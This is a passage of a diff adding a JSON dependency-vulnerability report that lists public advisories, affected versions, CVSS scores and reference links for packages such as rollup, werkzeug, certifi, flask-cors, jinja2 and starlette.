false) =\u003e\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} \u0026\u0026 ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' \u0026\u0026${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "rollup",
+                    "purl": "pkg:npm/rollup"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.29.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-gcx4-mw62-g8wm/GHSA-gcx4-mw62-g8wm.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "rollup",
+                    "purl": "pkg:npm/rollup"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.22.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-gcx4-mw62-g8wm/GHSA-gcx4-mw62-g8wm.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "rollup",
+                    "purl": "pkg:npm/rollup"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.79.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-gcx4-mw62-g8wm/GHSA-gcx4-mw62-g8wm.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/rollup/rollup"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-09-23T22:11:02Z",
+                "nvd_published_at": "2024-09-23T16:15:06Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-gcx4-mw62-g8wm"
+              ],
+              "aliases": [
+                "CVE-2024-47068",
+                "GHSA-gcx4-mw62-g8wm"
+              ],
+              "max_severity": "8.3"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "werkzeug",
+            "version": "3.0.2",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-06-25T02:53:36Z",
+              "published": "2024-05-06T14:21:27Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-2g68-c3qc-8985",
+              "aliases": [
+                "CVE-2024-34069"
+              ],
+              "related": [
+                "CGA-3r85-33vp-g92x",
+                "CGA-4j52-qrxr-72wj",
+                "CGA-mmv2-q2vv-5j43",
+                "CGA-v7pm-fgrf-j9wg",
+                "CGA-x38f-2x56-r747"
+              ],
+              "summary": "Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain",
+              "details": "The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "werkzeug",
+                    "purl": "pkg:pypi/werkzeug"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1",
+                    "0.10",
+                    "0.10.1",
+                    "0.10.2",
+                    "0.10.3",
+                    "0.10.4",
+                    "0.11",
+                    "0.11.1",
+                    "0.11.10",
+                    "0.11.11",
+                    "0.11.12",
+                    "0.11.13",
+                    "0.11.14",
+                    "0.11.15",
+                    "0.11.2",
+                    "0.11.3",
+                    "0.11.4",
+                    "0.11.5",
+                    "0.11.6",
+                    "0.11.7",
+                    "0.11.8",
+                    "0.11.9",
+                    "0.12",
+                    "0.12.1",
+                    "0.12.2",
+                    "0.13",
+                    "0.14",
+                    "0.14.1",
+                    "0.15.0",
+                    "0.15.1",
+                    "0.15.2",
+                    "0.15.3",
+                    "0.15.4",
+                    "0.15.5",
+                    "0.15.6",
+                    "0.16.0",
+                    "0.16.1",
+                    "0.2",
+                    "0.3",
+                    "0.3.1",
+                    "0.4",
+                    "0.4.1",
+                    "0.5",
+                    "0.5.1",
+                    "0.6",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.7",
+                    "0.7.1",
+                    "0.7.2",
+                    "0.8",
+                    "0.8.1",
+                    "0.8.2",
+                    "0.8.3",
+                    "0.9",
+                    "0.9.1",
+                    "0.9.2",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "1.0.0",
+                    "1.0.0rc1",
+                    "1.0.1",
+                    "2.0.0",
+                    "2.0.0rc1",
+                    "2.0.0rc2",
+                    "2.0.0rc3",
+                    "2.0.0rc4",
+                    "2.0.0rc5",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.2",
+                    "2.2.0",
+                    "2.2.0a1",
+                    "2.2.1",
+                    "2.2.2",
+                    "2.2.3",
+                    "2.3.0",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.3.3",
+                    "2.3.4",
+                    "2.3.5",
+                    "2.3.6",
+                    "2.3.7",
+                    "2.3.8",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-2g68-c3qc-8985/GHSA-2g68-c3qc-8985.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34069"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pallets/werkzeug/commit/3386395b24c7371db11a5b8eaac0c91da5362692"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/pallets/werkzeug"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H4SH32AM3CTPMAAEOIDAN7VU565LO4IR"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HFERFN7PINV4MOGMGA3DPIXJPDCYOEJZ"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.netapp.com/advisory/ntap-20240614-0004"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-352"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-05-06T14:21:27Z",
+                "nvd_published_at": "2024-05-06T15:15:23Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-2g68-c3qc-8985"
+              ],
+              "aliases": [
+                "CVE-2024-34069",
+                "GHSA-2g68-c3qc-8985"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "certifi",
+            "version": "2024.2.2",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:28Z",
+              "published": "2024-07-05T20:06:40Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-248v-346w-9cwc",
+              "aliases": [
+                "CVE-2024-39689"
+              ],
+              "related": [
+                "CGA-2ph7-wp75-g3rf",
+                "CGA-326j-45xp-qqrg",
+                "CGA-3727-xg6m-m6g6",
+                "CGA-45m3-cj8x-crxc",
+                "CGA-6v56-8m7g-x649",
+                "CGA-8493-6499-2mc5",
+                "CGA-8qgh-gj56-2mhf",
+                "CGA-c75v-5wrv-rvg2",
+                "CGA-f5h2-p64r-hgpf",
+                "CGA-fhg8-gq72-6xvf",
+                "CGA-h6wc-fp5f-mqrx",
+                "CGA-h96w-2q45-hmp9",
+                "CGA-hcf8-8qrq-xmgx",
+                "CGA-hv83-mq7r-r58m",
+                "CGA-m8x2-jj4x-r82h",
+                "CGA-mgvx-56mp-qxp4",
+                "CGA-q6pm-r7m9-gp6f",
+                "CGA-r3c7-44cm-2pr4",
+                "CGA-wgrc-28p5-r64q"
+              ],
+              "summary": "Certifi removes GLOBALTRUST root certificate",
+              "details": "Certifi 2024.07.04 removes root certificates from \"GLOBALTRUST\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\nGLOBALTRUST's root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues\". Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI).",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "certifi",
+                    "purl": "pkg:pypi/certifi"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "2021.05.30"
+                        },
+                        {
+                          "fixed": "2024.07.04"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "2021.10.8",
+                    "2021.5.30",
+                    "2022.12.7",
+                    "2022.5.18",
+                    "2022.5.18.1",
+                    "2022.6.15",
+                    "2022.6.15.1",
+                    "2022.6.15.2",
+                    "2022.9.14",
+                    "2022.9.24",
+                    "2023.11.17",
+                    "2023.5.7",
+                    "2023.7.22",
+                    "2024.2.2",
+                    "2024.6.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-248v-346w-9cwc/GHSA-248v-346w-9cwc.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-39689"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/certifi/python-certifi"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-345"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-07-05T20:06:40Z",
+                "nvd_published_at": "2024-07-05T19:15:10Z",
+                "severity": "LOW"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-248v-346w-9cwc"
+              ],
+              "aliases": [
+                "CVE-2024-39689",
+                "GHSA-248v-346w-9cwc"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "flask-cors",
+            "version": "4.0.0",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-05-07T13:31:00Z",
+              "published": "2024-04-19T21:31:08Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-84pr-m4jr-85g5",
+              "aliases": [
+                "CVE-2024-1681"
+              ],
+              "related": [
+                "CGA-29fc-3hfx-348c",
+                "CGA-4m77-hch5-975q",
+                "CGA-vqr9-gw75-6v3w"
+              ],
+              "summary": "flask-cors vulnerable to log injection when the log level is set to debug",
+              "details": "corydolphin/flask-cors is vulnerable to log injection when the log level is set to debug. An attacker can inject fake log entries into the log file by sending a specially crafted GET request containing a CRLF sequence in the request path. This vulnerability allows attackers to corrupt log files, potentially covering tracks of other attacks, confusing log post-processing tools, and forging log entries. The issue is due to improper output neutralization for logs.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "flask-cors",
+                    "purl": "pkg:pypi/flask-cors"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.7.4",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.9.0",
+                    "2.0.0",
+                    "2.0.0rc1",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.2",
+                    "2.1.3",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.10",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "4.0.0",
+                    "4.0.0a0"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-84pr-m4jr-85g5/GHSA-84pr-m4jr-85g5.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-1681"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/corydolphin/flask-cors"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/blob/40acc8092332dfed4bb54d7a4f89a6d479466de7/flask_cors/extension.py#L194"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.com/bounties/25a7a0ba-9fa2-4777-acb6-03e5539bb644"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-117"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-04-22T14:08:38Z",
+                "nvd_published_at": "2024-04-19T20:15:09Z",
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2024-09-17T18:03:28Z",
+              "published": "2024-08-18T21:31:07Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-hxwh-jpp2-84pm",
+              "aliases": [
+                "CVE-2024-6221",
+                "PYSEC-2024-71"
+              ],
+              "related": [
+                "CGA-4pc5-5847-jhc5"
+              ],
+              "summary": "Flask-CORS allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default",
+              "details": "A vulnerability in corydolphin/flask-cors version 4.0.1 allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default, without any configuration option. This behavior can expose private network resources to unauthorized external access, leading to significant security risks such as data breaches, unauthorized access to sensitive information, and potential network intrusions.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "flask-cors",
+                    "purl": "pkg:pypi/flask-cors"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.7.4",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.9.0",
+                    "2.0.0",
+                    "2.0.0rc1",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.2",
+                    "2.1.3",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.10",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "4.0.0",
+                    "4.0.0a0",
+                    "4.0.1"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-hxwh-jpp2-84pm/GHSA-hxwh-jpp2-84pm.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6221"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/issues/362"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/pull/363"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/pull/368"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/commit/7ae310c56ac30e0b94fb42129aa377bf633256ec"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/commit/c8514760cf03fcce16d77f6db7007aad429c4548"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/corydolphin/flask-cors"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/corydolphin/flask-cors/releases"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pypa/advisory-database/tree/main/vulns/flask-cors/PYSEC-2024-71.yaml"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-284"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-19T18:25:39Z",
+                "nvd_published_at": "2024-08-18T19:15:04Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2024-09-09T07:59:30Z",
+              "published": "2024-08-18T19:15:00Z",
+              "schema_version": "1.6.0",
+              "id": "PYSEC-2024-71",
+              "aliases": [
+                "CVE-2024-6221",
+                "GHSA-hxwh-jpp2-84pm"
+              ],
+              "details": "A vulnerability in corydolphin/flask-cors version 4.0.1 allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default, without any configuration option. This behavior can expose private network resources to unauthorized external access, leading to significant security risks such as data breaches, unauthorized access to sensitive information, and potential network intrusions.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "flask-cors",
+                    "purl": "pkg:pypi/flask-cors"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.0.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.7.4",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.9.0",
+                    "2.0.0",
+                    "2.0.0rc1",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.2",
+                    "2.1.3",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.10",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "4.0.0",
+                    "4.0.0a0",
+                    "4.0.1",
+                    "4.0.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/flask-cors/PYSEC-2024-71.yaml"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d"
+                }
+              ]
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-84pr-m4jr-85g5"
+              ],
+              "aliases": [
+                "CVE-2024-1681",
+                "GHSA-84pr-m4jr-85g5"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-hxwh-jpp2-84pm",
+                "PYSEC-2024-71"
+              ],
+              "aliases": [
+                "CVE-2024-6221",
+                "GHSA-hxwh-jpp2-84pm",
+                "PYSEC-2024-71"
+              ],
+              "max_severity": "8.7"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "jinja2",
+            "version": "3.1.3",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-06-10T19:01:19Z",
+              "published": "2024-05-06T14:20:59Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-h75v-3vvj-5mfj",
+              "aliases": [
+                "CVE-2024-34064"
+              ],
+              "related": [
+                "CGA-3h69-x6cf-g5c9",
+                "CGA-8hp4-mxq9-cfjp",
+                "CGA-j4qq-j23r-522f",
+                "CGA-ph4r-hmw2-vp9r",
+                "CGA-rwrm-vm7r-mrmj",
+                "CGA-w4rq-c3cf-82f3",
+                "CGA-x9j2-vg55-h4p4"
+              ],
+              "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+              "details": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `\u003e`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "jinja2",
+                    "purl": "pkg:pypi/jinja2"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "2.0",
+                    "2.0rc1",
+                    "2.1",
+                    "2.1.1",
+                    "2.10",
+                    "2.10.1",
+                    "2.10.2",
+                    "2.10.3",
+                    "2.11.0",
+                    "2.11.1",
+                    "2.11.2",
+                    "2.11.3",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.3.1",
+                    "2.4",
+                    "2.4.1",
+                    "2.5",
+                    "2.5.1",
+                    "2.5.2",
+                    "2.5.3",
+                    "2.5.4",
+                    "2.5.5",
+                    "2.6",
+                    "2.7",
+                    "2.7.1",
+                    "2.7.2",
+                    "2.7.3",
+                    "2.8",
+                    "2.8.1",
+                    "2.9",
+                    "2.9.1",
+                    "2.9.2",
+                    "2.9.3",
+                    "2.9.4",
+                    "2.9.5",
+                    "2.9.6",
+                    "3.0.0",
+                    "3.0.0a1",
+                    "3.0.0rc1",
+                    "3.0.0rc2",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.2",
+                    "3.1.3"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-h75v-3vvj-5mfj/GHSA-h75v-3vvj-5mfj.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34064"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/pallets/jinja"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-05-06T14:20:59Z",
+                "nvd_published_at": "2024-05-06T15:15:23Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-h75v-3vvj-5mfj"
+              ],
+              "aliases": [
+                "CVE-2024-34064",
+                "GHSA-h75v-3vvj-5mfj"
+              ],
+              "max_severity": "5.4"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "starlette",
+            "version": "0.37.2",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-10-15T20:01:19Z",
+              "published": "2024-10-15T18:12:57Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-f96h-pmfr-66vw",
+              "aliases": [
+                "CVE-2024-47874"
+              ],
+              "summary": "Starlette Denial of service (DoS) via multipart/form-data",
